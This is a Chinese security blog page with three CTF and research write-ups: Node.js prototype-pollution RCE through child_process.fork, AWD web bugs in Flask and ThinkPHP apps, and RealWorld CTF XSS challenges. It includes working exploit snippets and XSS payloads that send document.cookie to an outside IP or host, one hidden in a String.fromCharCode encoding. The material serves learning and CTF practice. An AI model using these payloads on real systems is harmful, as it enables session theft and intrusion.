<p>但是shell这个变量也是可以被污染的，不过child_process在这里做了限制，即使shell===false或字符串。最终传到execvp时也会被执行的参数替代，而不是真正的node进程。</p>
<p>这样看来在污染了原型的条件下，child_process只有进行了fork()的时候，才能达到漏洞的利用。不过这样的利用面确实太窄了，如果有师傅研究过其他函数的执行spawn时能启动node进程，可以交流一下思路</p>
<p>所以回到fork()函数，我们可以验证包含/proc/self/environ是可行的</p>
<pre><code>// test.js
proc = require(&#39;child_process&#39;);
var aa = {}
aa.__proto__.env = {&#39;AAAA&#39;:&#39;console.log(123)//&#39;,&#39;NODE_OPTIONS&#39;:&#39;--require /proc/self/environ&#39;}
proc.fork(&#39;./function.js&#39;);

//function.js
console.log(&#39;this is func&#39;)</code></pre><p><img src="http://static.zybuluo.com/1160307775/uzueehmtlujd7zwq0belponu/image_1dpindplj1ocv1q5o1ksf11v510o89.png" alt="image_1dpindplj1ocv1q5o1ksf11v510o89.png-23.3kB"></p>
<p>同时可以看到，fork在指定了modulepath的情况下，包含environ的同时并不影响modulepath中代码的执行。</p>
<h1 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h1><p><a href="https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/" target="_blank" rel="noopener">Exploiting prototype pollution – RCE in Kibana (CVE-2019-7609)</a><br><a href="http://cnode1.rssing.com/chan-68517434/all_p385.html" target="_blank" rel="noopener">spawn、exec、execFile和fork</a><br><a href="https://mp.weixin.qq.com/s?__biz=MzA4NzA5OTYzNw==&mid=2247483761&idx=1&sn=a366c51bd57b4fead862d11616a10b19&chksm=903fd0eba74859fd6ba296e29bf600a1004eeed72de3fb433c74d47654ce37a435e6d1e2742c&mpshare=1&scene=1&srcid=&sharer_sharetime=1571588210071&sharer_shareid=3674d5df50965fb924ba35f64042cb57&key=a2eb8c0b2340b20d3581c0a15949a693ac0879f7879b201f3878bc1f796bf6e8225380e8c186fbea7a3f5abb3c67841d7f71500c9619d916c3ced85f20b5d9cefdb3980e259d7e0c59132aada59c4132&ascene=1&uin=MTMyNzEzMTk2NQ%3D%3D&devicetype=Windows+10&version=62070152&lang=zh_CN&pass_ticket=866ICVsXH4EG%2FSMhWF45HLNA4E5jKkn%2Fh4V6bsGMzepRRdEW4YsHhfvV84kkAfIA" target="_blank" rel="noopener">Kibana漏洞之javascript原型链污染</a></p>

                
            </div>
            <div class="continue">
            <a href="/2019/11/20/从Kibana-RCE对nodejs子进程创建的思考/">
            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
            </a>
            </div>
        </article>
        
        <article class="post">
            <h1>
                <a class="title" href="/2019/10/20/字节跳动CTF线下赛Web题解&复盘/"> 
                    字节跳动CTF线下赛Web题解&amp;复盘 
                </a>
            </h1>
                        <div class="meta">
                <a class="date"> 
                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
                    2019-10-20   
                </a>
                
                
                
                <a class="tag">
                    <i class="fa fa-tags" aria-hidden="true"></i>  
                </a>
                
                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/AWD/">AWD</a></li></ul>
            </div>
            <div class="content">
                
                <h1 id="字节跳动CTF线下赛Web题解-amp-复盘"><a href="#字节跳动CTF线下赛Web题解-amp-复盘" class="headerlink" title="字节跳动CTF线下赛Web题解&amp;复盘"></a>字节跳动CTF线下赛Web题解&amp;复盘</h1><h1 id="PythonWeb"><a href="#PythonWeb" class="headerlink" title="PythonWeb"></a>PythonWeb</h1><h2 id="做题小谈"><a href="#做题小谈" class="headerlink" title="做题小谈"></a>做题小谈</h2><p>之前线下赛没运维过pythonweb，踩了很多坑，小记一下。</p>
<p>flask在更改代码后要重启才能生效，但是如果<code>app.DEBUG=True</code>则不需要重启flask，这个配置多见于<code>config.py</code>，比赛的时候也可以全局搜索。</p>
<p>目录结构如下<br><img src="http://static.zybuluo.com/1160307775/44a650nlxazo4hlxfio2jpd6/image_1dnm2lc67dmv18gg4fn1d95fq5m.png" alt="image_1dnm2lc67dmv18gg4fn1d95fq5m.png-112.2kB"></p>
<p>在pyweb的awd中，<strong>一定要先<code>ps -ef</code>看一下系统的进程，看看原始的服务是怎么启动的，我们就可以照着它的命令去重启flask</strong>，而不至于把服务启崩。这次我就是没有看进程，自己相当然的用命令<code>flask run</code>，结果被down了好几轮。</p>
<p>最后看了下手册，这里pyweb使用gunicorn来启动的：</p>
<pre><code>gunicorn -b 0.0.0.0:5000  manage:app</code></pre><h2 id="漏洞审计"><a href="#漏洞审计" class="headerlink" title="漏洞审计"></a>漏洞审计</h2><h3 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h3><pre><code>@main.route(&#39;/file&#39;)
def file():
    file = request.args.get(&#39;file&#39;,base64.b64encode(&#39;/tmp/Blog_mini/app/static/images/background.jpg&#39;))
    f = open(base64.b64decode(file),&#39;rb&#39;)
    res = f.read()
    return jsonify({&quot;res&quot;:res})</code></pre><p>request.args.get()获取file参数，如果参数不存在则为<code>base64.b64encode(&#39;/tmp/Blog_mini/app/static/images/background.jpg)</code></p>
<h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p>后台有一点路由<code>/backup</code>，可以调用popen()，那就可以先注册用户，再去rce。同时这个点应该也可以读取任意文件</p>
<pre><code>@main.route(&#39;/backup&#39;,methods = [&#39;GET&#39;])
@login_required
def backup():
    if request.args.get(&#39;name&#39;):
        shell = &#39;tar -zcf ./&#39;+ request.args.get(&#39;name&#39;) +&#39;.tar.gz ./&#39;
        res = os.popen(shell).read()
        ress = {&quot;res&quot;:res}
        return jsonify(ress)
    else:
        return &quot;param is name! please backup!&quot;</code></pre><p><img src="http://static.zybuluo.com/1160307775/xkcvhk7x2py4e8psnoftecq0/image_1dnm8r3b65901pom16tg12t1c031g.png" alt="image_1dnm8r3b65901pom16tg12t1c031g.png-34.8kB"></p>
<h3 id="模版注入"><a href="#模版注入" class="headerlink" title="模版注入"></a>模版注入</h3><p>这个点我没挖到，但是后来听别的师傅说存在404的ssti</p>
<pre><code>@main.app_errorhandler(404)
def page_not_found(e):
    for x in request.path:
        if x in &#39;._%&#39;:
            return render_template(&#39;404.html&#39;), 404
    template = &#39;&#39;&#39;
{%% block body %%}
    &lt;div class=&quot;center-content error&quot;&gt;
        &lt;h1&gt;Oops! That page doesn&#39;t exist in this Blog.&lt;/h1&gt;
        &lt;h3&gt;%s&lt;/h3&gt;
    &lt;/div&gt;
{%% endblock %%}
&#39;&#39;&#39; % (request.url)
    return render_template_string(template), 404</code></pre><p>过滤了<code>._%</code>，下面的ssti是经典的漏洞案例。利用<code>|</code>过滤器和动态传参就可以bypass了，跟今年护网杯的题目思路差不多，这里盗用一下@Smile师傅的payload</p>
<p><img src="http://static.zybuluo.com/1160307775/0ag6778ky7rmn2p6hbxeolyy/image_1dnp66nft9tm243119nifpt49.png" alt="image_1dnp66nft9tm243119nifpt49.png-91.2kB"></p>
<h2 id="流量记录"><a href="#流量记录" class="headerlink" title="流量记录"></a>流量记录</h2><p>这次还是吃了没流量的亏，测试了一下别人的py流量脚本，这里贴出来</p>
<pre><code>@main.before_request
def awdlog():
    import time
    f = open(&#39;/tmp/pylog.txt&#39;,&#39;a+&#39;)
    f.writelines(time.strftime(&#39;%Y-%m-%d %H:%M:%S\n&#39;, time.localtime(time.time())))
    f.writelines(&quot;{method} {url} \n&quot;.format(method=request.method,url=request.url))
    s = &#39;&#39;
    for d,v in dict(request.headers).items():
        s += &quot;%s: %s\n&quot;%(d,v)
    f.writelines(s+&#39;\n&#39;)
    s = &#39;&#39;
    for d,v in dict(request.form).items():
        s += &quot;%s=%s&amp;&quot;%(d,v)
    f.writelines(s.strip(&quot;&amp;&quot;))
    f.writelines(&#39;\n\n&#39;)
    f.close()</code></pre><p><strong>main</strong>指的是应用名，每次根据实际情况更改，最终在/tmp下生成日志<br><img src="http://static.zybuluo.com/1160307775/4ly8u0z2pqen24kyzhml5qt1/image_1dnn61c77p61mvu1v011ini1qtt7e.png" alt="image_1dnn61c77p61mvu1v011ini1qtt7e.png-533.4kB"></p>
<h1 id="Opensns"><a href="#Opensns" class="headerlink" title="Opensns"></a>Opensns</h1><p>基于TP3.2.2开发，比赛复现出两个漏洞。其中一个是内置后门就不说了，还有一个是渲染模版时的任意文件读取漏洞</p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="任意文件读取-1"><a href="#任意文件读取-1" class="headerlink" title="任意文件读取"></a>任意文件读取</h3><p><code>keywords[_filename]=/flag</code></p>
<p>漏洞点在<code>ThinkPHP/Library/Think/Storage/Driver/File.class.php</code>的File类驱动中，同时File类继承自Storage类：<code>class File extends Storage</code></p>
<p><img src="http://static.zybuluo.com/1160307775/19r0bw8jrs4a14a8r9emc8c6/image_1dnmqjgof1rfhksv1ae71engq2320.png" alt="image_1dnmqjgof1rfhksv1ae71engq2320.png-396.7kB"></p>
<p>在判断了$vars是否存在后，进行了一次变量覆盖，再调用load方法进行了文件包含。追踪一下哪里调用了load方法，发现都是在解析模版的时候调用的，这里选择文件<code>ThinkPHP/ThinkPHP/Library/Think/Template.class.php</code>的fetch()方法</p>
<p><img src="http://static.zybuluo.com/1160307775/qoihow4a22x8pzdf9i9eoxiv/image_1dnmrrf2k138168g9gm12sfoip2t.png" alt="image_1dnmrrf2k138168g9gm12sfoip2t.png-245.5kB"></p>
<p>发现可控参数<code>$templateVar</code>，会被当作实参传入load()，继续寻找调用fetch()方法的位置。因为TP代码中有很多实例化的方法，并不都像<code>storage::</code>这样的调用方式，只能全局搜索fetch看哪里调用。最终发现在<code>ThinkPHP/Library/Behavior/ParseTemplateBehavior.class.php</code>中实例化了Template类并且调用fetch()方法。</p>
<p><img src="http://static.zybuluo.com/1160307775/fmsgcdfr846jsn5g71sardnt/image_1dnms90lf1fbckc91cnr18281g1c3a.png" alt="image_1dnms90lf1fbckc91cnr18281g1c3a.png-505.2kB"></p>
<p>刚才说到可控参数<code>$templateVar</code>的原型在这里为<code>$_data</code>，那么<code>$_data</code>是否可控？继续追调用链，在这里追的时候就卡壳了，因为涉及到tp的一个知识：<a href="https://blog.csdn.net/u013927110/article/details/47000379" target="_blank" rel="noopener">Thinkphp下利用钩子使用行为扩展</a></p>
<p>简单来说就在xx文件中，先宏定义了监听器对应的类名再加载进程序(这里的类指的是类似于ParseTemplateBehavior.class.php这种的行为拓展类)<br><img src="http://static.zybuluo.com/1160307775/ab7rmh3hiapj8i4ns6dqrwvi/image_1dnmt4sfa1c6ja0pgb4v00mft4q.png" alt="image_1dnmt4sfa1c6ja0pgb4v00mft4q.png-50.2kB"></p>
<p>而后，程序中的Hook机制通过触发不同类型的监听器，实现对应行为拓展类的实例化且会调用对应行为拓展类的run方法。一个简单的触发机制就是<code>Hook::Listen(tags,prarm)</code>。</p>
<p>那么在这里我们希望它触发<code>view_parse</code>，从而实例化<code>ParseTemplateBehavior</code>。就全局搜索<code>Hook::listen(&#39;view_parse&#39;</code>。在TP的视图类里找到了该监听器的hook<br><img src="http://static.zybuluo.com/1160307775/d7u78w1qao6dkos6xtce62gw/image_1dnmtdrpd6t6101m1omechn1n0857.png" alt="image_1dnmtdrpd6t6101m1omechn1n0857.png-507.6kB"></p>
<p>接下来就好说了，只要<code>$parama</code>可控，并且找到一处能够调用fetch函数的地方，整条利用链就完整了。</p>
<p>其中$param的取值经过一系列的操作</p>
<pre><code>public function assign($name, $value = &#39;&#39;)
{
    if (is_array($name)) {
        $this-&gt;tVar = array_merge($this-&gt;tVar, $name);
    } else {
        $this-&gt;tVar[$name] = $value;
    }
}

$params = array(&#39;var&#39; =&gt; $this-&gt;tVar, &#39;file&#39; =&gt; $templateFile, &#39;content&#39; =&gt; $content, &#39;prefix&#39; =&gt; $prefix);</code></pre><p>file、content、prefix为定值，只有<code>$this-&gt;tvar</code>可操作且被assign函数赋值。这里存在以前tp3的模版rce漏洞的挖掘链，通过assign这个模版赋值函数，赋值变量<code>$this-&gt;tvar</code>。</p>
<p>同时这里还涉及Tp的一个小操作：在tp3.2中，对模版的加载&amp;渲染依靠<code>ThinkPHP/ThinkPHP/Library/Think/View.class.php</code>。先通过View类方法<code>assgin()</code>对模版赋值，再调用<code>display()</code>加载模板和页面输出。在display函数的内部同时实现了<code>fetch()</code>函数解析并获取模板内容，也解决了上面调用fetch函数的困扰。</p>
<p>所以只需要找一个Controller，接受post/get传入参数，并且能够传入<code>assign()</code>去模版赋值，之后再经过tp的<code>display()</code>函数渲染模版，这里出题人在控制器里造了一个方法search，接受keywords参数</p>
<pre><code>public function search()
{
    $keywords=I(&#39;post.keywords&#39;,&#39;&#39;,&#39;text&#39;);

    $modules = D(&#39;Common/Module&#39;)-&gt;getAll();
    foreach ($modules as $m) {
        if ($m[&#39;is_setup&#39;] == 1 &amp;&amp; $m[&#39;entry&#39;] != &#39;&#39;) {
            if (file_exists(APP_PATH . $m[&#39;name&#39;] . &#39;/Widget/SearchWidget.class.php&#39;)) {
                $mod[] = $m[&#39;name&#39;];
            }
        }
    }
    $show_search = get_kanban_config(&#39;SEARCH&#39;, &#39;enable&#39;, $mod, &#39;Home&#39;);

    $this-&gt;assign($keywords);
    $this-&gt;assign(&#39;showBlocks&#39;, $show_search);
    $this-&gt;display();
}</code></pre><p>构造如下poc本地包含文件，由于开启了ob_start()。<br><img src="http://static.zybuluo.com/1160307775/rxlpeekkh3xij9ql2ltkfr7m/image_1dnn1fspe10st1i4rbe6nt1p6g5k.png" alt="image_1dnn1fspe10st1i4rbe6nt1p6g5k.png-208.2kB"></p>
<p>总结来说，该点漏洞就是加载模版的时候，把本地文件作为模版变量赋值，再渲染到页面。这个在平常的代码审计中也是一个不错的思路，膜出题人。</p>
<h1 id="douchat"><a href="#douchat" class="headerlink" title="douchat"></a>douchat</h1><p>同样使用TP3.2.2开发的</p>
<h2 id="漏洞浮现"><a href="#漏洞浮现" class="headerlink" title="漏洞浮现"></a>漏洞浮现</h2><h3 id="代码注入"><a href="#代码注入" class="headerlink" title="代码注入"></a>代码注入</h3><p>跟opensns类似的漏洞，也是模版的渲染，只不过这次存在content参数，即生成的缓存有效时，加载缓存造成代码注入。由于开启了ob_start()，因此在include的时候代码注入<br><img src="http://static.zybuluo.com/1160307775/rqxm9hrlwxtkdfxn6xznrey2/image_1dnn52qdims3v3217dm1s6ph8f6h.png" alt="image_1dnn52qdims3v3217dm1s6ph8f6h.png-535.2kB"></p>
<h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><p>漏洞文件：/Public/Plugins/webuploader/server/preview.php</p>
<pre><code>$src = file_get_contents(&#39;php://input&#39;);
if (preg_match(&quot;#^data:image/(\w+);base64,(.*)$#&quot;, $src, $matches)) {

    $previewUrl = sprintf(
        &quot;%s://%s%s&quot;,
        isset($_SERVER[&#39;HTTPS&#39;]) &amp;&amp; $_SERVER[&#39;HTTPS&#39;] != &#39;off&#39; ? &#39;https&#39; : &#39;http&#39;,
        $_SERVER[&#39;HTTP_HOST&#39;],
        $_SERVER[&#39;REQUEST_URI&#39;]
    );
    $previewUrl = str_replace(&quot;preview.php&quot;, &quot;&quot;, $previewUrl);


    $base64 = $matches[2];
    $type = $matches[1];
    if ($type === &#39;jpeg&#39;) {
        $type = &#39;jpg&#39;;
    }

    $filename = md5($base64).&quot;.$type&quot;;
    $filePath = $DIR.DIRECTORY_SEPARATOR.$filename;

    if (file_exists($filePath)) {
        die(&#39;{&quot;jsonrpc&quot; : &quot;2.0&quot;, &quot;result&quot; : &quot;&#39;.$previewUrl.&#39;preview/&#39;.$filename.&#39;&quot;, &quot;id&quot; : &quot;id&quot;}&#39;);
    } else {
        $data = base64_decode($base64);
        file_put_contents($filePath, $data);
        die(&#39;{&quot;jsonrpc&quot; : &quot;2.0&quot;, &quot;result&quot; : &quot;&#39;.$previewUrl.&#39;preview/&#39;.$filename.&#39;&quot;, &quot;id&quot; : &quot;id&quot;}&#39;);
    }

} else {
    die(&#39;{&quot;jsonrpc&quot; : &quot;2.0&quot;, &quot;error&quot; : {&quot;code&quot;: 100, &quot;message&quot;: &quot;un recoginized source&quot;}}&#39;);
}</code></pre><p><code>$src</code>可控，通过伪协议控制生成的文件名，然后写入到preview/下并回显出来</p>

                
            </div>
            <div class="continue">
            <a href="/2019/10/20/字节跳动CTF线下赛Web题解&复盘/">
            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
            </a>
            </div>
        </article>
        
        <article class="post">
            <h1>
                <a class="title" href="/2019/09/24/RealWorld CTF2019 两道XSS-Web题解/"> 
                    RealWorld CTF2019 两道XSS-Web题解 
                </a>
            </h1>
                        <div class="meta">
                <a class="date"> 
                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
                    2019-09-24   
                </a>
                
                
                
                <a class="tag">
                    <i class="fa fa-tags" aria-hidden="true"></i>  
                </a>
                
                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web/">Web</a></li></ul>
            </div>
            <div class="content">
                
                <h1 id="RealWorld-CTF2019-两道XSS-Web题解"><a href="#RealWorld-CTF2019-两道XSS-Web题解" class="headerlink" title="RealWorld CTF2019 两道XSS-Web题解"></a>RealWorld CTF2019 两道XSS-Web题解</h1><p>原文首发于安全客:<a href="https://www.anquanke.com/post/id/186707" target="_blank" rel="noopener">https://www.anquanke.com/post/id/186707</a></p>
<h2 id="Mission-Invisible"><a href="#Mission-Invisible" class="headerlink" title="Mission Invisible"></a>Mission Invisible</h2><p>题目上来把代码全部给出来了，一段js并且告诉我们有两个隐藏的点</p>
<pre><code>&lt;script&gt;
    var getUrlParam = function (name) {
        var reg = new RegExp(&quot;(^|&amp;)&quot; + name + &quot;=([^&amp;]*)(&amp;|$)&quot;);
        var r = unescape(window.location.search.substr(1)).match(reg);
        if (r != null) return r[2];
        return null;
    }

    function setCookie(name, value) {
        var Days = 30;
        var exp = new Date();
        exp.setTime(exp.getTime() + Days * 24 * 60 * 60 * 30);
        document.cookie = name + &quot;=&quot; + value + &quot;;expires=&quot; + exp.toGMTString();
    }

    function getCookie(name) {
        var search = name + &quot;=&quot;
        var offset = document.cookie.indexOf(search)
        if (offset != -1) {
            offset += search.length;
            var end = document.cookie.indexOf(&quot;;&quot;, offset);
            if (end == -1) {
                end = document.cookie.length;
            }
            return unescape(document.cookie.substring(offset, end));
        }
        else return &quot;&quot;;
    }

    function setElement(tag) {
        tag = tag.substring(0, 1);
        var ele = document.createElement(tag)
        var attrs = getCookie(&quot;attrs&quot;).split(&quot;&amp;&quot;);
        for (var i = 0; i &lt; attrs.length; i++) {
            var key = attrs[i].split(&quot;=&quot;)[0];
            var value = attrs[i].split(&quot;=&quot;)[1];
            ele.setAttribute(key, value);
        }
        document.body.appendChild(ele);
    }

    var tag = getUrlParam(&quot;tag&quot;);
    setCookie(&quot;tag&quot;, tag);
    setElement(tag);

&lt;/script&gt;</code></pre><p>重点在这个<code>setElement</code>函数，通过tag.substring(0, 1)创建一个dom事件，然后从cookie种取出attrs属性进行标签属性的赋值。接下来追一下cookie是怎么入库的</p>
<pre><code>var tag = getUrlParam(&quot;tag&quot;);
setCookie(&quot;tag&quot;, tag);</code></pre><p>追到函数不难发现是tag传参进去的，并且在<code>getcookie</code>函数中只截取了”attrs=”的后面的值，那么我们就可以在value里插入attrs的值。</p>
<p><img src="http://static.zybuluo.com/1160307775/8nnawoe6cckqbj8v45i7u28p/image_1dksu3lma1sdcaodk0j19g11tn213.png" alt="image_1dksu3lma1sdcaodk0j19g11tn213.png-115.9kB"></p>
<p>所以现在的难点就在于怎么构造一个标签，在浏览器解析的时候自动触发XSS。由于<code>tag = tag.substring(0, 1);</code>这段代码，使得我们现在能用的标签只有a、p。</p>
<p>最初我的想法是污染原型链，在循环遍历attrs的时候：</p>
<pre><code>第一次key = __proto__.ele  &amp; value = document.createElement(“script”)

第二次 key = src  &amp; value = evil.com</code></pre><p>但是尝试了一下发现这样并不能够成功污染，因为我们已经定义了ele这个变量。那只能从a、p标签下手，这里@LFY师傅想到一个很好的方法</p>
<p><img src="http://static.zybuluo.com/1160307775/qxend2mls2etcgiz0das8h9z/image_1dksuhiqvuci17tssl8o111eh720.png" alt="image_1dksuhiqvuci17tssl8o111eh720.png-97.5kB"></p>
<pre><code>&lt;p onfocus=&quot;alert(document.cookie)&quot; id=&quot;1&quot; tabindex=&quot;0&quot;&gt;&lt;/p&gt;</code></pre><p>我们可以通过tableindex使标签可聚焦，只需要在url后面跟一个锚点指向标签id，类似于<code>#1</code>，这样聚焦时触发onfocus，效果就等效于自动触发xss。</p>
<pre><code>http://52.52.236.217:16401/?tag=a%3d1attrs%3donmouserover%3d1%2526onfocus%3dalert(1)%2526id%3d1%2526tabindex%3d0#1</code></pre><p><img src="http://static.zybuluo.com/1160307775/guipvs8t8hxfv0rxvm7hvjse/image_1dksundi8iu3lrfhnnpkunra2d.png" alt="image_1dksundi8iu3lrfhnnpkunra2d.png-249.6kB"></p>
<p>接着就是常规打cookie到本地</p>
<pre><code>http://52.52.236.217:16401/?tag=a=attrs=onmouseover=1%2526onfocus=eval(String.fromCharCode(119,105,110,100,111,119,46,108,111,99,97,116,105,111,110,61,39,104,116,116,112,58,47,47,49,51,57,46,49,57,57,46,50,48,51,46,50,53,51,58,49,50,51,52,47,39,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101))%2526id=1%2526tabindex=0#1</code></pre><h2 id="Hcorme"><a href="#Hcorme" class="headerlink" title="Hcorme"></a>Hcorme</h2><h3 id="题目说明"><a href="#题目说明" class="headerlink" title="题目说明"></a>题目说明</h3><p>首先题目有一个callback的接口，能够把请求参数输出，并且是text/html形式。这点其实在日常的web应用种并不多见，大多数callback的mime都是javascript</p>
<p><img src="http://static.zybuluo.com/1160307775/ieklsfj1adpr8wcyfwcp6k29/image_1dkseq56a1q3f111911ftas01les9.png" alt="image_1dkseq56a1q3f111911ftas01les9.png-111.3kB"></p>
<p>于此同时题目有两个难点需要bypass：</p>
<ul>
<li>XSS Auditor的限制<br><img src="http://static.zybuluo.com/1160307775/i0q4o5jr15jip56ufv4qbx5b/image_1dksf8oneelujp2n651k3a1qbu13.png" alt="image_1dksf8oneelujp2n651k3a1qbu13.png-183.7kB"></li>
</ul>
<ul>
<li>CSP的限制<pre><code>Content-Security-Policy: default-src &#39;self&#39;; object-src &#39;none&#39;; base-uri &#39;none&#39;;</code></pre></li>
</ul>
<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>先着眼xss auditor这个点，在Chrome78以后XSS-Auditor被Chrome自家砍掉了，虽然auditor曾是不少xsser在面对反射性XSS时候的难题，但随着bypass的方法也日益增多，auditor的弊远远大于利：因为auditor在触发的时候会删除恶意输入，之前我博客中有一篇文章<a href="https://hpdoger.cn/2019/07/02/%E5%89%8D%E7%AB%AF%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E5%8A%AB%E6%8C%81/">前端全局变量劫持</a>，就能够利用Auditor达到变量劫持的目的。</p>
<p>于此同时Bypass auditor也算是出题人给我们的Hint。</p>
<p>当时我的思路是用字符集去bypass，也就是下面这种思路<br><img src="http://static.zybuluo.com/1160307775/urr4wey9p4wqrnt88qknu6el/image_1dksffho3ttit161ctftckbo61g.png" alt="image_1dksffho3ttit161ctftckbo61g.png-62.5kB"></p>
<p>因为auditor的核心思路就是拿浏览器的渲染和我们的输入做比较，不相符则不会被Check。不过chrome77已经不存在iso-2022-jp这种绕过的方法。接下来我们看一下Hardold师傅的思路–&gt;<strong>utf-16编码绕过</strong></p>
<p>这里串一个编码的知识点，通常我们看到%xx%xx这类的url编码，其实是用16进制表示的，比如utf-8编码形式如下</p>
<pre><code>&gt;&gt;&gt; from urllib.parse import quote,unquote
&gt;&gt;&gt; print(quote((&#39;猪&#39;).encode(&#39;utf-8&#39;)))
&gt;&gt;&gt; %E7%8C%AA</code></pre><p>那么”猪”这个字在utf-8编码下就是<code>0xe7 0x8c 0xaa</code>，下面我们来看一下utf-16编码下的”猪”怎么表示</p>
<pre><code>&gt;&gt;&gt; from urllib.parse import quote,unquote
&gt;&gt;&gt; print(quote((&#39;猪&#39;).encode(&#39;utf-16&#39;)))
&gt;&gt;&gt; %FF%FE%2As</code></pre><p>这时会发现，用utf-16无论编码什么字符，前两个字节都是``0xff0xfe`<br><img src="http://static.zybuluo.com/1160307775/hw1p5epypji3hs4ceofrjada/image_1dksl9ssig0pv2l1f171qr31c5q1t.png" alt="image_1dksl9ssig0pv2l1f171qr31c5q1t.png-98.4kB"></p>
<p>因为在UTF-16文件的开首，都会放置一个U+FEFF字符作为Byte Order Mark（UTF-16LE以FF FE代表，UTF-16BE以FE FF代表），以显示这个文本文件是以UTF-16编码，它是个没有宽度也没有断字的空白。</p>
<p>此时我们来尝试一下能否Bypass XSS Auditor</p>
<pre><code>&gt;&gt;&gt; print(quote((&#39;&lt;script&gt;alert(1)&lt;/script&gt;&#39;).encode(&#39;utf-16&#39;)))

%FF%FE%3C%00s%00c%00r%00i%00p%00t%00%3E%00a%00l%00e%00r%00t%00%28%001%00%29%00%3C%00/%00s%00c%00r%00i%00p%00t%00%3E%00</code></pre><p><img src="http://static.zybuluo.com/1160307775/wosh7er7qz9zoevz5m9lv3tx/image_1dksm95e81qka1ts9meii2m1cd92q.png" alt="image_1dksm95e81qka1ts9meii2m1cd92q.png-227.5kB"></p>
<p>成功插入标签，接下来到了第二步，Bypass CSP。因为锁了default-src又没有给unsafe-inline，但是题目有一个jsonp的点，不难想到今年的那道<a href="https://corb3nik.github.io/blog/ins-hack-2019/bypasses-everywhere" target="_blank" rel="noopener">ins’hack 2019/的bypasses-everywhere</a></p>
<p>这篇文章的大意相当于利用jsonp直接把js代码”挂载”到本地的script标签里面，从而导致的bypass。那么我们编写一个demo看看</p>
<pre><code>&gt;&gt;&gt; print(quote((&#39;&lt;script/src=?callback=alert(1)&gt;&lt;/script&gt;&#39;).encode(&#39;utf-16&#39;)))

%FF%FE%3C%00s%00c%00r%00i%00p%00t%00/%00s%00r%00c%00%3D%00%3F%00c%00a%00l%00l%00b%00a%00c%00k%00%3D%00a%00l%00e%00r%00t%00%28%001%00%29%00%3E%00%3C%00/%00s%00c%00r%00i%00p%00t%00%3E%00</code></pre><p>可以看到进行了两次资源请求，第二次的资源的执行类型是script<br><img src="http://static.zybuluo.com/1160307775/jo3855qgvjiy2kl23v5m050f/image_1dkssc09a13h01mnh8561rft1g0u9.png" alt="image_1dkssc09a13h01mnh8561rft1g0u9.png-154.8kB"></p>
<p>接着就是把flag打到自己的本地就行了</p>
<pre><code>&gt;&gt;&gt; print(quote((&quot;&lt;script/src=?callback=window.location=&#39;http://xxx/?&#39;%2bdocument.cookie%0a//&gt;&lt;/script&gt;&quot;).encode(&#39;utf-16&#39;)))

%FF%FE%3C%00s%00c%00r%00i%00p%00t%00/%00s%00r%00c%00%3D%00%3F%00c%00a%00l%00l%00b%00a%00c%00k%00%3D%00w%00i%00n%00d%00o%00w%00.%00l%00o%00c%00a%00t%00i%00o%00n%00%3D%00%27%00h%00t%00t%00p%00%3A%00/%00/%00x%00x%00x%00/%00%3F%00%27%00%25%002%00b%00d%00o%00c%00u%00m%00e%00n%00t%00.%00c%00o%00o%00k%00i%00e%00%25%000%00a%00/%00/%00%3E%00%3C%00/%00s%00c%00r%00i%00p%00t%00%3E%00</code></pre><h2 id="比赛总结"><a href="#比赛总结" class="headerlink" title="比赛总结"></a>比赛总结</h2><p>赛题质量真心高，膜Harlold师傅，日常拿0day打比赛..orz</p>

                
            </div>
            <div class="continue">
            <a href="/2019/09/24/RealWorld CTF2019 两道XSS-Web题解/">
            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
            </a>
            </div>
        </article>
        
</section>

  <nav class="page-nav">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
  </nav>

    </main>
    <a class="not-found">not found!</a>
    <div class="search-items">
    </div>
    <a href="#header" id="top" style="display:none">
        <i class="fa fa-sort-asc fa-2x"></i>
    </a>
    <footer class="footer">
    <div class="footer-copyright">©️2017
    <a href="//github.com/Vevlins/toki" class="link" target="_blank">Toki</a>  by Vevlins
    </div>
</footer>

    <script src="/js/jquery.js"></script>
    <script src="/js/toki.js"></script>  
  <script>hljs.initHighlightingOnLoad();</script>
</body>
</html>